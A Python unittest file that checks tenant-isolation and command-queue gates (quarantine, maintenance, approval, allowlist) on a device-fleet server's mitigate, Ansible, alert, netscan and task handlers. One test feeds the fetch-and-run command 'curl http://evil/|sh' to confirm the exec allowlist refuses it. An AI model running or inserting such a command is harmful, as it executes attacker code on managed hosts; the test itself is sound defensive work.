"""
v7.0.2 — the gates that were missing on four device-id handlers routed OUTSIDE
``/api/devices/``, where ``main()``'s pre-dispatch ``_enforce_device_scope``
never sees them.

  1. ``/api/mitigate/<id>/investigate`` + ``/fix`` — no tenant gate at all
     (``require_perm`` returns early for any admin role and never consults
     tenancy), and the queue append bypassed maintenance / four-eyes /
     quarantine / audit-mode / queue-cap / OS-support / the exec allowlist
     because it wrote CMDS_FILE directly instead of going through
     ``_queue_command_batch``.
  2. ``POST /api/ansible/playbooks/<id>/run`` — target types ``all`` and
     ``site`` built their host set straight off the device store instead of the
     ``_resolve_targets`` chokepoint.
  3. ``POST /api/alerts/<id>/{ack,unack,resolve}`` — the 404/409 guards were
     raised inside a ``try`` whose ``except Exception`` rewrote them to 500
     (``respond()`` raises ``HTTPError``, which extends ``Exception``).
  4. ``GET/DELETE /api/netscan-schedules`` and ``POST /api/tasks``.

Only ``verify_token`` / ``get_token_from_request`` are stubbed. Stubbing
``require_auth`` / ``require_perm`` / ``require_admin_auth`` would let a handler
with NO gate at all pass, which is the failure these tests exist to catch.

Both directions are asserted throughout: the cross-tenant (or quarantined /
audit-mode) caller is refused AND the legitimate same-tenant caller still gets
its work done.

Pure stdlib ``unittest`` so it runs under ``python -m unittest discover`` (what
``make dist`` uses on the staged release tree) as well as pytest.
"""
import os
import sys
import tempfile
import unittest
from pathlib import Path

# api.py runs ensure_default_user() at import, which WRITES — pin the data dir
# before the import or a targeted run of this module targets a live install.
os.environ.setdefault("RP_DATA_DIR", tempfile.mkdtemp())

_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_ROOT / "server" / "cgi-bin"))

import api  # noqa: E402


class _TenantBase(unittest.TestCase):
    """A two-tenant fleet with tenancy_enforced on, and 'aadmin' — an admin of
    tenantA — logged in. A tenant missing from TENANTS_FILE resolves to
    'default', which would silently make that caller a SUPERADMIN and every
    assertion below vacuous, so the registry is seeded with both tenants."""

    _FILES = ("DEVICES_FILE", "ROLES_FILE", "CMDS_FILE", "CONFIG_FILE",
              "USERS_FILE", "TENANTS_FILE", "AUDIT_LOG_FILE", "ALERTS_FILE",
              "ANSIBLE_FILE", "NETSCAN_SCHEDULES_FILE", "TASKS_FILE",
              "CONFIRMATIONS_FILE")
    _FUNCS = ("get_token_from_request", "verify_token", "get_json_body",
              "get_json_obj", "respond", "audit_log", "log_command",
              "fire_webhook", "current_username", "_ansible_available")

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self._saved = {a: getattr(api, a) for a in self._FILES}
        for a in self._FILES:
            # Take the BASENAME from the attribute being replaced: under the
            # SQL backends the filename picks the TABLE, so an invented name
            # would not be the store the handler reads.
            setattr(api, a, self.tmp / self._saved[a].name)
        self._saved_logs = api.MITIGATE_LOGS_DIR
        api.MITIGATE_LOGS_DIR = self.tmp / "mitigate-logs"
        self._saved_fns = {f: getattr(api, f) for f in self._FUNCS}
        self._saved_env = getattr(api._RCTX, "environ", None)

        api.respond = lambda status, body=None: (
            _ for _ in ()).throw(api.HTTPError(status, body))
        api.audit_log = lambda *a, **k: None
        api.log_command = lambda *a, **k: None
        api.fire_webhook = lambda *a, **k: None
        api.get_json_body = lambda: {}
        api.get_json_obj = lambda: {}
        api._ansible_available = lambda: True
        api._LOAD_CACHE.clear()

        api.save(api.TENANTS_FILE, {
            "default": {"name": "Default", "status": "active",
                        "created": 0, "builtin": True},
            "tenantA": {"name": "A", "status": "active", "created": 0},
            "tenantB": {"name": "B", "status": "active", "created": 0},
        })
        api.save(api.USERS_FILE, {
            "aadmin": {"role": "admin", "tenant_id": "tenantA"},
            "root":   {"role": "admin", "tenant_id": "default"},
        })
        api.save(api.CONFIG_FILE, {"tenancy_enforced": True})
        api.save(api.DEVICES_FILE, self.devices())
        api._LOAD_CACHE.clear()
        self.set_caller("aadmin")
        self.set_method("POST")

    def tearDown(self):
        for a, v in self._saved.items():
            setattr(api, a, v)
        api.MITIGATE_LOGS_DIR = self._saved_logs
        for f, v in self._saved_fns.items():
            setattr(api, f, v)
        api._RCTX.environ = self._saved_env
        api._LOAD_CACHE.clear()

    # ── fixture / driving helpers ───────────────────────────────────────────
    def devices(self):
        return {
            "devA": {"name": "A1", "tenant": "tenantA", "site": "hq",
                     "ip": "10.0.0.1"},
            "devB": {"name": "B1", "tenant": "tenantB", "site": "hq",
                     "ip": "10.0.0.9"},
            "devQ": {"name": "Q1", "tenant": "tenantA", "quarantined": True},
            "devR": {"name": "R1", "tenant": "tenantA",
                     "sysinfo": {"audit_mode": True}},
        }

    def set_caller(self, user, role="admin"):
        api.get_token_from_request = lambda: "tok"
        api.verify_token = lambda tok: (user, role)
        api.current_username = lambda: user

    def set_method(self, m):
        api._RCTX.environ = {"REQUEST_METHOD": m}

    def set_body(self, payload):
        api.get_json_body = lambda: dict(payload)
        api.get_json_obj = lambda: dict(payload)

    def call(self, handler, *args):
        """(status, body) — HTTPError.body is a dict. None status = fell off
        the end of the handler without responding."""
        api._LOAD_CACHE.clear()
        try:
            handler(*args)
        except api.HTTPError as e:
            return (e.status, e.body)
        return (None, None)

    def queued(self, dev_id):
        api._LOAD_CACHE.clear()
        return (api.load(api.CMDS_FILE) or {}).get(dev_id, [])


_FIX_BODY = {"kind": "service_down", "target": "nginx",
             "command": "systemctl restart nginx", "confirmation": "RUN"}


class TestMitigateTenantGate(_TenantBase):
    """Item 1a — the two write entry points had no tenant gate."""

    def test_fix_cross_tenant_refused_and_queues_nothing(self):
        self.set_body(_FIX_BODY)
        status, body = self.call(api.handle_mitigate_fix, "devB")
        self.assertEqual(status, 403)
        self.assertIn("tenant", (body or {}).get("error", "").lower())
        self.assertEqual(self.queued("devB"), [])

    def test_investigate_cross_tenant_refused_and_queues_nothing(self):
        self.set_body({"kind": "service_down", "target": "nginx"})
        status, _ = self.call(api.handle_mitigate_investigate, "devB")
        self.assertEqual(status, 403)
        self.assertEqual(self.queued("devB"), [])

    def test_fix_same_tenant_still_queues(self):
        """The other direction: the gate must not break the legitimate call."""
        self.set_body(_FIX_BODY)
        status, body = self.call(api.handle_mitigate_fix, "devA")
        self.assertEqual(status, 200)
        q = self.queued("devA")
        self.assertEqual(len(q), 1)
        # The mitigate tag has to survive into the queued string or the result
        # capture cannot attribute the output back to this action.
        self.assertTrue(q[0].startswith(f"exec:#mitigate:{body['action_id']}#"))
        self.assertTrue(q[0].endswith("systemctl restart nginx"))

    def test_investigate_same_tenant_still_queues(self):
        self.set_body({"kind": "service_down", "target": "nginx"})
        status, body = self.call(api.handle_mitigate_investigate, "devA")
        self.assertEqual(status, 200)
        self.assertEqual(len(self.queued("devA")), 1)

    def test_superadmin_reaches_every_tenant(self):
        """A platform operator is not confined — tenancy must not become a
        blanket refusal."""
        self.set_caller("root")
        self.set_body(_FIX_BODY)
        status, _ = self.call(api.handle_mitigate_fix, "devB")
        self.assertEqual(status, 200)
        self.assertEqual(len(self.queued("devB")), 1)


class TestMitigateQueueGates(_TenantBase):
    """Item 1b — the bare CMDS_FILE append skipped every queue gate. Live on
    every install, tenancy or not."""

    def test_quarantined_device_refused(self):
        self.set_body(_FIX_BODY)
        status, body = self.call(api.handle_mitigate_fix, "devQ")
        self.assertEqual(status, 400)
        self.assertIn("quarantin", (body or {}).get("error", "").lower())
        self.assertEqual(self.queued("devQ"), [])

    def test_audit_mode_device_refused(self):
        self.set_body(_FIX_BODY)
        status, body = self.call(api.handle_mitigate_fix, "devR")
        self.assertEqual(status, 400)
        self.assertIn("audit", (body or {}).get("error", "").lower())
        self.assertEqual(self.queued("devR"), [])

    def test_maintenance_mode_refused(self):
        api.save(api.CONFIG_FILE, {"tenancy_enforced": True,
                                   "maintenance_mode": True,
                                   "maintenance_reason": "controller upgrade"})
        api._LOAD_CACHE.clear()
        self.set_body(_FIX_BODY)
        status, _ = self.call(api.handle_mitigate_fix, "devA")
        self.assertEqual(status, 503)
        self.assertEqual(self.queued("devA"), [])

    def test_four_eyes_parks_instead_of_queueing(self):
        api.save(api.CONFIG_FILE, {"tenancy_enforced": True,
                                   "change_approval_enabled": True,
                                   "approval_gated_kinds": ["exec"]})
        api._LOAD_CACHE.clear()
        self.set_body(_FIX_BODY)
        status, body = self.call(api.handle_mitigate_fix, "devA")
        self.assertEqual(status, 200)
        self.assertTrue(body.get("approval_required"))
        self.assertTrue(body.get("confirmation_id"))
        # Parked, not dispatched.
        self.assertEqual(self.queued("devA"), [])

    def test_queue_cap_refused(self):
        api.save(api.CMDS_FILE,
                 {"devA": [f"exec:filler{i}" for i in range(api.MAX_QUEUED_PER_DEVICE)]})
        api._LOAD_CACHE.clear()
        self.set_body(_FIX_BODY)
        status, body = self.call(api.handle_mitigate_fix, "devA")
        self.assertEqual(status, 400)
        self.assertIn("queue full", (body or {}).get("error", "").lower())
        self.assertEqual(len(self.queued("devA")), api.MAX_QUEUED_PER_DEVICE)

    def test_exec_allowlist_enforced(self):
        devs = self.devices()
        devs["devA"]["allowed_commands"] = ["systemctl restart nginx"]
        api.save(api.DEVICES_FILE, devs)
        api._LOAD_CACHE.clear()
        self.set_body(dict(_FIX_BODY, command="curl http://evil/|sh"))
        status, body = self.call(api.handle_mitigate_fix, "devA")
        self.assertEqual(status, 400)
        self.assertIn("allowed_commands", (body or {}).get("error", ""))
        self.assertEqual(self.queued("devA"), [])
        # And the allowlisted command still goes through.
        self.set_body(_FIX_BODY)
        status, _ = self.call(api.handle_mitigate_fix, "devA")
        self.assertEqual(status, 200)
        self.assertEqual(len(self.queued("devA")), 1)

    def test_refused_run_leaves_no_orphan_log(self):
        """A refusal must not leave the status endpoint showing a phantom
        'queued' action for a command that never went anywhere — including the
        maintenance drain, which responds from inside the queue call."""
        self.set_body(_FIX_BODY)
        self.call(api.handle_mitigate_fix, "devQ")
        self.assertEqual(self._log_files(), [])

        api.save(api.CONFIG_FILE, {"tenancy_enforced": True,
                                   "maintenance_mode": True})
        api._LOAD_CACHE.clear()
        self.set_body(_FIX_BODY)
        self.assertEqual(self.call(api.handle_mitigate_fix, "devA")[0], 503)
        self.assertEqual(self._log_files(), [])

    def _log_files(self):
        logs = api.MITIGATE_LOGS_DIR
        return sorted(f.name for f in logs.iterdir()) if logs.exists() else []


class TestAnsibleTargetScope(_TenantBase):
    """Item 2 — target types 'all' and 'site' bypassed the tenant chokepoint."""

    def setUp(self):
        super().setUp()
        api.save(api.ANSIBLE_FILE, {"playbooks": [
            {"id": "pb1", "name": "p", "content": "- hosts: all\n"}]})
        api._LOAD_CACHE.clear()

    def _run(self, target):
        # No ssh_user: the run stops right after the target set is resolved, so
        # the 400 that comes back names which stage was reached.
        self.set_body({"target": target})
        return self.call(api.handle_ansible_playbook_run, "pb1")

    def test_all_excludes_other_tenants(self):
        """Only devB (tenantB) has an IP among the non-tenantA hosts here, and
        devA is dropped for having none, so 'no targets' proves devB is out."""
        devs = self.devices()
        devs["devA"].pop("ip")
        api.save(api.DEVICES_FILE, devs)
        api._LOAD_CACHE.clear()
        status, body = self._run({"type": "all"})
        self.assertEqual(status, 400)
        self.assertIn("No target devices", (body or {}).get("error", ""))

    def test_site_excludes_other_tenants(self):
        devs = self.devices()
        devs["devA"].pop("ip")
        api.save(api.DEVICES_FILE, devs)
        api._LOAD_CACHE.clear()
        status, body = self._run({"type": "site", "value": "hq"})
        self.assertEqual(status, 400)
        self.assertIn("No target devices", (body or {}).get("error", ""))

    def test_all_still_finds_own_tenant(self):
        status, body = self._run({"type": "all"})
        self.assertEqual((status, (body or {}).get("error")),
                         (400, "ssh_user required"))

    def test_site_still_finds_own_tenant(self):
        status, body = self._run({"type": "site", "value": "hq"})
        self.assertEqual((status, (body or {}).get("error")),
                         (400, "ssh_user required"))

    def test_superadmin_all_reaches_every_tenant(self):
        self.set_caller("root")
        devs = self.devices()
        devs["devA"].pop("ip")
        api.save(api.DEVICES_FILE, devs)
        api._LOAD_CACHE.clear()
        status, body = self._run({"type": "all"})
        self.assertEqual((status, (body or {}).get("error")),
                         (400, "ssh_user required"))


class TestAlertMutationStatusCodes(_TenantBase):
    """Item 3 — respond() raises HTTPError, so a 404/409 raised inside the try
    was caught by `except Exception` and rewritten to 500."""

    def setUp(self):
        super().setUp()
        api.save(api.ALERTS_FILE, {"alerts": [
            {"id": "closed", "event": "x", "device_id": "devA",
             "resolved_at": 123, "acknowledged_at": 123},
            {"id": "open", "event": "x", "device_id": "devA"},
            {"id": "acked", "event": "x", "device_id": "devA",
             "acknowledged_at": 1, "acknowledged_by": "u"},
            {"id": "foreign", "event": "x", "device_id": "devB"},
        ]})
        api._LOAD_CACHE.clear()
        self.set_body({})

    def test_ack_already_resolved_is_409_not_500(self):
        self.assertEqual(self.call(api.handle_alert_ack, "closed")[0], 409)

    def test_unack_already_resolved_is_409_not_500(self):
        self.assertEqual(self.call(api.handle_alert_unack, "closed")[0], 409)

    def test_resolve_already_resolved_is_409_not_500(self):
        self.assertEqual(self.call(api.handle_alert_resolve, "closed")[0], 409)

    def test_cross_tenant_alert_is_404_not_500(self):
        for fn in (api.handle_alert_ack, api.handle_alert_unack,
                   api.handle_alert_resolve):
            with self.subTest(fn=fn.__name__):
                self.assertEqual(self.call(fn, "foreign")[0], 404)

    def test_happy_paths_still_work(self):
        self.assertEqual(self.call(api.handle_alert_ack, "open")[0], 200)
        self.assertEqual(self.call(api.handle_alert_unack, "acked")[0], 200)
        self.assertEqual(self.call(api.handle_alert_resolve, "open")[0], 200)
        api._LOAD_CACHE.clear()
        rows = {a["id"]: a for a in api.load(api.ALERTS_FILE)["alerts"]}
        self.assertEqual(rows["open"]["resolved_by"], "aadmin")
        self.assertIsNone(rows["acked"]["acknowledged_at"])


class TestNetscanScheduleScope(_TenantBase):
    """Item 4a — the list handed out every tenant's device names + internal
    CIDRs + schedule ids, and the delete took any of those ids."""

    def setUp(self):
        super().setUp()
        api.save(api.NETSCAN_SCHEDULES_FILE, {
            "sA": {"id": "sA", "device_id": "devA", "subnet": "10.1.0.0/24",
                   "interval_minutes": 60, "enabled": True, "last_run": 0,
                   "created_by": "aadmin"},
            "sB": {"id": "sB", "device_id": "devB", "subnet": "10.9.9.0/24",
                   "interval_minutes": 60, "enabled": True, "last_run": 0,
                   "created_by": "root"},
        })
        api._LOAD_CACHE.clear()

    def _list(self):
        self.set_method("GET")
        status, body = self.call(api.handle_netscan_schedules)
        self.assertEqual(status, 200)
        return {s["id"]: s for s in body["schedules"]}

    def test_list_hides_other_tenants(self):
        rows = self._list()
        self.assertEqual(set(rows), {"sA"})

    def test_list_superadmin_sees_all(self):
        self.set_caller("root")
        self.assertEqual(set(self._list()), {"sA", "sB"})

    def test_delete_cross_tenant_refused(self):
        self.set_method("DELETE")
        status, _ = self.call(api.handle_netscan_schedule_delete, "sB")
        self.assertEqual(status, 404)
        api._LOAD_CACHE.clear()
        self.assertIn("sB", api.load(api.NETSCAN_SCHEDULES_FILE))

    def test_delete_own_tenant_still_works(self):
        self.set_method("DELETE")
        status, _ = self.call(api.handle_netscan_schedule_delete, "sA")
        self.assertEqual(status, 200)
        api._LOAD_CACHE.clear()
        self.assertNotIn("sA", api.load(api.NETSCAN_SCHEDULES_FILE))


class TestTasksAddScope(_TenantBase):
    """Item 4b — handle_tasks_update gates a retarget onto another tenant's
    device; handle_tasks_add shared the validator and did not."""

    def setUp(self):
        super().setUp()
        api.save(api.TASKS_FILE, {"tasks": []})
        api._LOAD_CACHE.clear()

    def _tasks(self):
        api._LOAD_CACHE.clear()
        return (api.load(api.TASKS_FILE) or {}).get("tasks", [])

    def test_add_pinned_to_other_tenant_refused(self):
        self.set_body({"title": "recon", "device_id": "devB",
                       "state": "upcoming"})
        status, _ = self.call(api.handle_tasks_add)
        self.assertEqual(status, 404)
        self.assertEqual(self._tasks(), [])

    def test_add_own_tenant_still_works(self):
        self.set_body({"title": "patch", "device_id": "devA",
                       "state": "upcoming"})
        status, _ = self.call(api.handle_tasks_add)
        self.assertEqual(status, 200)
        self.assertEqual([t["device_id"] for t in self._tasks()], ["devA"])

    def test_add_without_a_device_still_works(self):
        """A fleet-level task has nothing tenant-specific to leak."""
        self.set_body({"title": "write runbook", "state": "upcoming"})
        status, _ = self.call(api.handle_tasks_add)
        self.assertEqual(status, 200)
        self.assertEqual(len(self._tasks()), 1)


if __name__ == "__main__":
    unittest.main()
